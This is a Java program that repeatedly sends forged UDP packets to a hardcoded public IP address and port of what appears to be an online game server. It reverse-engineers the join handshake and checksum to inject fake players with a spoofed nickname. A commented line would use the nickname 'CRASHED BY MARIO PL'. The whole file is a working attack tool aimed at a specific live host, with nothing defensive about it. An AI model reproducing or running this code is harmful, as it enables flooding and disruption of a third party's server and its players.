/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package mfakeplayers;

import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import javax.xml.bind.DatatypeConverter;

/**
 *
 * @author Mateusz
 */
public class MFakePlayers {

    static String ip;
    static int port;
    static DatagramSocket socket;


    public static void main(String[] args) {
        try {


            ip = "13.126.50.181";
            port = 26003;
            while (true) {
                socket = new DatagramSocket();
                //pakiet info

                byte[] mapinfo = sendPck("deadbeefabababababababab0000000005abababbadeabee");
            byte map = mapinfo[98];
            //pierwszy join
            String join = "deadbeefabababababababab000" + map + "001400ababab0" + map + "00000000000000000000000000000000000000badeabee";
            byte[] odp = sendPck(join);
            //pobieramy z odpowiedzi dane potrzebne do kolejnego pakietu
            int z1 = odp[24] - 1;
            int z2 = odp[28];
            //trzeci pakiet
            String cmd = "deadbeef"
                    + "0100000000000000"
                    + "0000"
                    + "0000"
                    + "03ababab"
                    + "01000000ffffffff"
                    + "4c505243"
                    + "00000000"
                    + "00000000"
                    + "00000000000000000000000000000000ffffffff00000000ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
            //petla dolacza dlugi nick CRASHED BY MARIO PL
            //cmd = cmd.concat("2043524153484544204259204d4152494f20504c");
            String nick = "4d4152494f20504c";
            cmd = cmd.concat(nick);
            for (int i = 0; i < 128-nick.length(); i++) {
                cmd = cmd.concat("0");
                }
            cmd +="6a6f6e6573315f31000a000000000000badeabee";//i koniec pakietu
            //konwertujemy hex string na byte
            byte[] pck3 = DatatypeConverter.parseHexBinary(cmd);
            //wrzucamy dane pobrane z info
            pck3[32] = (byte) z1;   // w tym wypadku trzeba bylo odjac 1 od wartosci
            pck3[33] = odp[25];
            pck3[34] = odp[26];
            pck3[35] = odp[27];
            pck3[36] = (byte) z2;   //to chyba id gracza ale tez tak jak bugs odejmujemy 1

            byte[] crc = checksum(pck3);   //crc
            pck3[12] = crc[0];
            pck3[13] = crc[1];
            byte[] size = sized(pck3);     //rozmiar pakietu
            pck3[14] = size[0];
            pck3[15] = size[1];

                Thread.sleep(5000);
                sendHexPck(pck3);
                socket.close();
            }

        } catch (Exception e) {
            System.out.println("asd"+e);
        }
    }

    static public String sendStrPck(String msg) {
        String message = "";
        try {
            InetAddress servAddr = InetAddress.getByName(ip);
            byte buf[] = msg.getBytes();
            // DatagramSocket socket= new DatagramSocket();
            socket.setSoTimeout(2000);

            socket.send(new DatagramPacket(buf, buf.length, servAddr, port));              //nastepnie komende
            buf = new byte[4096];
            DatagramPacket packet = new DatagramPacket(buf, buf.length);
            socket.receive(packet);  //odbieramy komende

            message = new String(packet.getData());
            message = message.trim();
            //message = message.substring(22,message.length()-4);

        } catch (Exception ex) {
            System.out.println("pakietasdasda " + ex);
        }
        return message;
    }

    static public byte[] sendPck(String str) {
        byte[] msg = DatatypeConverter.parseHexBinary(str);
        DatagramPacket packet = null;
        try {
            InetAddress servAddr = InetAddress.getByName(ip);
            byte buf[] = msg;
            socket.setSoTimeout(5000);

            socket.send(new DatagramPacket(buf, buf.length, servAddr, port));              //nastepnie komende
            buf = new byte[4096];

            packet = new DatagramPacket(buf, buf.length);
            socket.receive(packet);  //odbieramy komende

        } catch (Exception ex) {
            System.out.println("pakiet " + ex);
            return null;
        }
        return packet.getData();
    }

    static public String sendHexPck(byte[] msg) {
        String message = "";
        try {
            InetAddress servAddr = InetAddress.getByName(ip);
            byte buf[] = msg;
            socket.setSoTimeout(2000);
            socket.send(new DatagramPacket(buf, buf.length, servAddr, port));              //nastepnie komende
            byte[] buff = new byte[4096];
            DatagramPacket packet = new DatagramPacket(buff, buff.length);
            socket.receive(packet);  //odbieramy komende
            socket.close();

        } catch (Exception ex) {
            System.out.println("pakiet " + ex);
        }
        return message;
    }

    static byte[] checksum(byte[] pck) {
        int crc = 0;
        for (int i = 20; i < pck.length - 4; i++) {
            //zaczynamy od 20 bo to jest tzn HEADSZ
            int x;
            if (pck[i] == -1) {
                x = 255;
            } else {
                x = pck[i];
            }

            if (x < 0) {
                x += 256;
            }
            crc += x;
            //w bugsie jak liczy crc to jak dochodzi do 65535 to od nowa liczy 
            if (crc > 65536) {
                crc = crc - 65536;
            }
        }
        //robimy tu cos w stylu htons
        int b1 = crc / 256;
        int b2 = crc % 256;
        byte[] ret = new byte[]{(byte) b1, (byte) b2};
        return ret;
    }

    static byte[] sized(byte[] pck) {
        int size = pck.length - 24;
        int b1 = size / 256;
        int b2 = size % 256;
        byte[] ret = new byte[]{(byte) b1, (byte) b2};
        return ret;
    }
}